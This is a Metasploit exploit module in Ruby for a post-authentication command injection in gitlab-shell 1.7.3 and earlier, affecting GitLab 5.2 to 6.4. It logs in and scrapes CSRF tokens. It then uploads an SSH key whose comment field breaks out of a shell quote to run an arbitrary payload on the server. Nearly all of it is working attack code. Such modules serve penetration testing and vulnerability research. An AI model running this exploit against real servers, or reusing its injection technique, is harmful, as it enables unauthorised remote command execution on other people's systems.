##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Gitlab SSH Key Post-Auth Remote Command Exec",
      'Description'    => %q{
      This module takes advantage of a vulnerability in the gitlab-shell v1.7.3
      and prior.

      This module was tested against 5.2, 5.3, 5.4, 6.0, 6.1, 6.2 which were vulnerable
      by default when shipped. Also tested was 6.3 and 6.4 since it is possible an admin
      updated gitlab but not gitlab-shell, leaving the system still vulnerable.

      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
        ],
      'References'     =>
        [
        ],
      'Arch'            => ARCH_CMD,
      'Version' => '2',
      'Compat'          =>
        {
          'PayloadType' => 'cmd'
        },
      'Platform'       => %w{ linux unix },
      'Targets'        =>
        [
          ['Gitlab 6.2, 6.3, 6.4',
            {
              'Endpoint' => '/profile/keys'
            }
          ],
          ['Gitlab 6.0, 6.1', 
            {
              'Endpoint' => '/profile/keys'
            }
          ],
          ['Gitlab 5.2, 5.3, 5.4',
            {
              'Endpoint' => '/keys'
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 04 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('USERNAME',  [true, 'Gitlab Username', 'admin']),
          OptString.new('PASSWORD',  [true, 'Gitlab Password', 'admin']),
        ], self.class)
  end

  def exploit
    init = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/users/sign_in")
    })

    if !init or init.code != 200
      fail_with ("Invalid response")
    end

    cookies = init.get_cookies

    init.body =~ /<input name="authenticity_token" type="hidden" value="(.*)" \/><\/div>/
    auth_token = $1

    post_data = {
      'utf8' => "\xE2\x9C\x93",
      'authenticity_token' => auth_token,
      'user[login]' => datastore['USERNAME'],
      'user[password]' => datastore['PASSWORD'],
    }

    login = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/users/sign_in"),
      'method' => 'POST',
      'headers' => {
        'Connection' => 'keep-alive',
      },
      'vars_post' => post_data,
      'cookie' => cookies
    })

    if !login or login.code != 302
      fail_with("Login failed")
    end

    cookies = login.get_cookies

    tmp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, target['Endpoint']+"/new"),
      'cookie' => cookies
    })

    tmp.body =~ /<meta content="(.*)" name="csrf-token" \/>/
    auth_token = $1

    cookies = tmp.get_cookies if target.name =~ /6\.0, 6\.1$/

    post_data = {
      'utf8' => "\xE2\x9C\x93",
      'authenticity_token' => auth_token,
      'key[title]' => Rex::Text.rand_text_alpha(8),
      'key[key]' => 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN+/nM6Z+tFGweT2rJJ+E2klZjYKowK1oLk'+
                    'gl/Wo8JUu7P6hkMX6zQvpKEyir8HqZoV9xX9Zw4ionBbWb844GyyA5iyBhOy2pmhyFQxwAnL+'+
                    'hM9Z2CrNC0NakwUFfY8eLKGrrwEk0HQEEkW/iHpJHvQ8dtb6IPx3SYT3omCayszICPTzB48C8'+
                    'hKOSZKgYLNPq9gNxU7hmo8oNOv3Ve1RB1SR/ajbDoqroYacdgoZZmM/OL0YYQWCX+e9PugXTF'+
                    '+45YZFBLOflsOp+HQRivIumb8hpkSPGn7p21IQxLbCHssNb596DI20hBVXN+LC6N+iUvMIfpM'+
                    'KyyCFk1AZuTn5ff admin@local.host\';' + payload.encoded + ';echo \'hi'
    }

    #trigger payload
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, target['Endpoint']),
      'method' => 'POST',
      'vars_post' => post_data,
      'cookie' => cookies
    })

  end
end
